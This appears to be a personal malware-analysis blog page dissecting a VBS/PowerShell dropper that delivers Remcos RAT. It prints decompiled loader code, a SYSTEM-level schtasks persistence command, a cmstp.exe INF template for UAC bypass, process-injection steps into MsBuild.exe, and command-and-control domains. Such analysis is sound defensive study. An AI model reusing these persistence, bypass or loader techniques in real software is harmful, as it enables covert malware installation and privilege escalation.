@@ -1,0 +1,345 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Rat - My Analysis</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../favicon.svg">
+        <link rel="shortcut icon" href="../favicon.png">
+        <link rel="stylesheet" href="../css/variables.css">
+        <link rel="stylesheet" href="../css/general.css">
+        <link rel="stylesheet" href="../css/chrome.css">
+        <link rel="stylesheet" href="../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="highlight-css" href="../highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="../tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "../";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">My Analysis</h1>
+
+                    <div class="right-buttons">
+                        <a href="../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <p>At the time of writing it is around a day that malicious script appeared in wild. To practice and improve myself I chose this malware.</p>
+<p>For now in virustotal, it can be seen that malware is only detected by 9 AVs and the server for downloading second payload (<em>png</em> file) is still available to be downloaded.</p>
+<p>Starting with analysis, The file's size is really big but only reason for it was repeat of same 10 lines.
+<img src="https://github.com/basicacc/basicacc.github.io/blob/main/My_analysis/Malware_4/1.png?raw=true" alt="1|500" /></p>
+<p>Using ASCII table we can replace all occurrences of these variables with their Char values.</p>
+<p>At first it looked like it is only repeating same 10 line for increasing file size (to look legit), but one more reason was probably trying to hide obfuscated code. (Maybe not but only good explanation is this)
+<img src="https://github.com/basicacc/basicacc.github.io/blob/main/My_analysis/Malware_4/2.png?raw=true" alt="1|1000" /></p>
+<p>At first it might not make sense but you can obviously see same pattern repeat in obfuscated code:
+<code>"⏳लბ⣿༑₫ᨑԿ🖲ᅫҌ⊣ሒȪ⟚"</code></p>
+<p>and payload use <code>categorised(ByVal inputText)</code> function to deobfuscate it. (By removing repeating line)
+<img src="https://github.com/basicacc/basicacc.github.io/blob/main/My_analysis/Malware_4/3.png?raw=true" alt="1|800" /></p>
+<p>In this situation manually writing deobfuscater  would be possible to but, it is waste of time. I just changed <code>dozens = categorised(dozens)</code> with <code>WScript.Echo categorised(dozens)</code> (Don't forget to only copy necessary parts in new file to avoid running something dangerous). I ran the code using <strong>cscript.exe</strong> to see output in my <strong>cmd</strong>.</p>
+<p><img src="https://github.com/basicacc/basicacc.github.io/blob/main/My_analysis/Malware_4/4.png?raw=true" alt="1|800" /></p>
+<p>Now to deobfuscate, we need to replace '#' with 'A' and convert base64 to string. Once again instead of using cyberchef I just run powershell code with removing <code>Invoke-Expression</code> and beautify it a little bit. This is the code that downloads second file. (png)</p>
+<p><img src="https://github.com/basicacc/basicacc.github.io/blob/main/My_analysis/Malware_4/5.png?raw=true" alt="1|800" />
+A day later, the malicious file was deleted from server but I installed it before, so I can continue my analysis. I will also upload file to <strong>malware bazaar</strong> for anyone that needs it to analyse on his own.</p>
+<p>This image file has Data starting with '&lt;&lt;BASE64_START&gt;&gt;' and ends with '&lt;&lt;BASE64_END&gt;&gt;' after decoded it is uploaded to memory but I modified code and used function:</p>
+<pre><code class="language-ps1">[System.IO.File]::WriteAllBytes("C:\dnlib_image.dll", $cleared)
+</code></pre>
+<p>to save it in a file and when we load this dll to dnspy-x86, it loads it as <code>Microsoft.Win32.TaskScheduler, Version=1.1.0.0</code> and dnlib inside, which is necessary part of us:
+<img src="https://raw.githubusercontent.com/basicacc/basicacc.github.io/refs/heads/main/My_analysis/Malware_4/6.png" alt="1|800" /></p>
+<p>You can check out <a href="https://github.com/robsonfelix/VMDetector">Robson Felix's VMDetector</a>to understand how it works. I modified qemu strings in my system so I have 0 "qemu" string, which helps me avoid detection. this script is really basic as it checks for only "qemu" (easy to stay undetected).
+Note: Even though this malware has function to check detect vms, it doesn't use it. (if you remember the arguments given when VAI is called, they are necessary part of this function)</p>
+<p>In next line we can see the malicious code calling specific function that is interesting for us, <strong>VAI</strong>.</p>
+<p><img src="https://github.com/basicacc/basicacc.github.io/blob/main/My_analysis/Malware_4/7.png?raw=true" alt="1|1000" /></p>
+<p>some of the variable names are written in Spanish, which might be a tip for malware writer being Spanish. (Of course, it is not a guarantee)</p>
+<p>I have written custom code in C# to be able to manually debug this dll.</p>
+<p>The functions, VAI didn't use: persistence, startuptask, startupreg (even though it could). (To make it clear these are not function names, these are variables)</p>
+<p>Moving on, startup_onstart is actually used, let's understand what it does.
+Before understanding the function, I retrivied Hashtable values that are used through dll and saved all of them to single file to make analysis easier.</p>
+<p>This is the part we have to analyze now:</p>
+<pre><code class="language-csharp">if (flag12)
+{
+	bool flag13 = !File.Exists(Path.Combine(caminho, nomedoarquivo + \uE11C.\uE000(12567) + extençao));
+	bool flag14 = flag13;
+	if (flag14)
+	{
+		Process.Start(new ProcessStartInfo
+		{
+			WindowStyle = ProcessWindowStyle.Hidden,
+			FileName = \uE11C.\uE000(12607), // "cmd.exe"
+			Arguments = string.Concat(new string[]
+			{
+				// "/C copy *."
+				\uE11C.\uE000(12599),
+				// "vbs"
+				extençao,
+				// " \""
+				\uE11C.\uE000(12770),
+				//  1. @"C:\ProgramData" 2. "millipascals"
+				Path.Combine(caminho, nomedoarquivo), 
+				// "."
+				\uE11C.\uE000(12567),
+				// "vbs"
+				extençao,
+				// "\""
+				\uE11C.\uE000(12282)
+			})
+		}).WaitForExit();
+	}
+	Loader.ExecutarMetodoVAI(taskname, caminho, nomedoarquivo, extençao);
+}
+</code></pre>
+<p>Basically checks if file exists, if not, starts new process:
+`cmd.exe /C copy *.vbs "C:\ProgramData\millipascals.vbs"
+copies the vbs file to its new location.</p>
+<p><strong>ExecutarMetodoVAI</strong> is called with arguments: <code>"blinkered" @"C:\ProgramData"	"millipascals" "vbs"</code></p>
+<p>at first line, function searches for specific string in resources:
+<code>string text = Array.Find&lt;string&gt;(Assembly.GetExecutingAssembly().GetManifestResourceNames(), new Predicate&lt;string&gt;(Loader.&lt;&gt;c.&lt;&gt;9.\uE000));</code></p>
+<p>When using dnspy, it hides compiler generated types and modules by default which you need to enable.</p>
+<p>The <code>(Loader.&lt;&gt;c.&lt;&gt;9.\uE000)</code> sets condition <strong>true</strong> if "string" ends with "UAC.dll"
+and in next lines, first stream is loaded into an array and array was loaded to caller program (powershell):</p>
+<pre><code class="language-C#">byte[] array;
+using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text))
+{
+	using (MemoryStream memoryStream = new MemoryStream())
+	{
+		manifestResourceStream.CopyTo(memoryStream);
+		array = memoryStream.ToArray();
+	}
+}
+Assembly assembly = Assembly.Load(array);
+</code></pre>
+<p>and calls "Main" method in UAC.dll (type:UAC.Program).</p>
+<p><img src="https://raw.githubusercontent.com/basicacc/basicacc.github.io/refs/heads/main/My_analysis/Malware_4/8.png" alt="1|800" /></p>
+<p>Which I will use new custom script to run it and debug manually.</p>
+<p>First thing "UAC.dll" does is create a new string:
+<code>@"cmd.exe /c powershell -Command ""schtasks /Create /TN 'blinkered' /TR 'wscript.exe C:\ProgramData\millipascals.vbs' /SC ONSTART /RL HIGHEST /RU SYSTEM /F"""</code> with given parameters.</p>
+<ul>
+<li>Generates new inf file under temporary path.</li>
+<li>Changes "REPLACE_COMMAND_FILE" in <code>private static string INF_TEMPLATE = "[version]\r\nSignature=$chicago$\r\nAdvancedINF=2.5\r\n\r\n[DefaultInstall]\r\nCustomDestination=CustInstDestSectionAllUsers\r\nRunPreSetupCommands=RunPreSetupCommandsSection\r\n\r\n[RunPreSetupCommandsSection]\r\nREPLACE_COMMAND_LINE\r\ntaskkill /IM cmstp.exe /F\r\n\r\n[CustInstDestSectionAllUsers]\r\n49000,49001=AllUSer_LDIDSection, 7\r\n\r\n[AllUSer_LDIDSection]\r\n\"HKLM\", \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%UnexpectedError%\", \"\"\r\n\r\n[Strings]\r\nServiceName=\"CorpVPN\"\r\nShortSvcName=\"CorpVPN\"";</code> with the command created before.</li>
+<li>writes this to inf file.</li>
+</ul>
+<p>Part 2:</p>
+<ul>
+<li>Checks if file: "C:\Windows\system32\cmstp.exe" exists.</li>
+<li>if it does, Start new process: <code>C:\Windows\system32\cmstp.exe /au "&lt;inf_file_path&gt;"</code></li>
+<li>Basically creates new process to run at every startup for persistence purposes.</li>
+<li>Why use cmstp.exe? To avoid some detections.</li>
+</ul>
+<p>That's all with UAC.dll, now we have to go back to <code>dnlib.IO.Home.VAI</code>.</p>
+<p>To sum up, in next steps malicious dll function launches MsBuild.exe and modifies its code and resumes thread.</p>
+<ul>
+<li>new process: MsBuild.exe created.</li>
+<li>Allocate new space</li>
+<li>Write the malicious program at address: 0x400000</li>
+</ul>
+<p>What I did was copy every data that is written and combine them to get a single exe file (Microsoft Visual C++ 8)</p>
+<pre><code class="language-console">copy /b to400000.bin+to401000.bin+to459000.bin+to472000.bin+to478000.bin+to47D000.bin combined.exe
+</code></pre>
+<p>So, the reason malware loads the exe file into MsBuild.exe is actually utilizing its capabilities (and hiding). So it might be possible to debug program alone but it is hard, so I will just debug it inside MsBuild.exe. I also found a key point in code like this:
+<code>unaff_ESI = FUN_0040e560(0x400000,0,pcVar7);</code> which I guess probably where we need to start from, because inside this function, it is also prossible to clearly see some interesting strings.
+The strings clearly indicate the capabilities of malware: RAT, keylogger, stealer, logger.</p>
+<p>By the way, Remcos RAT is available <a href="https://breakingsecurity.net/remcos/free/">here</a> to explore its capabilities.</p>
+<p>After analyzing the exe file, the key points that can be addressed is:</p>
+<ol>
+<li>Malware use GetProcAddress function to find address of the functions it is going to use (which can make static analysis a little bit difficult), but you can basically change heap variable name's function name (for example in ghidra)</li>
+<li>Malware keep trying to connect with "relentlesswicked.duckdns.org"/"relentless.webredirect.org", which it can't, because it is down.</li>
+<li>The rest is specifically about remcos itself which if needed can be analyzed on its own, and it is not that hard as it is not packed or obfuscated.</li>
+</ol>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../Remcos/empty.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../SmokeLoader/empty.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../Remcos/empty.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../SmokeLoader/empty.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../elasticlunr.min.js"></script>
+        <script src="../mark.min.js"></script>
+        <script src="../searcher.js"></script>
+
+        <script src="../clipboard.min.js"></script>
+        <script src="../highlight.js"></script>
+        <script src="../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
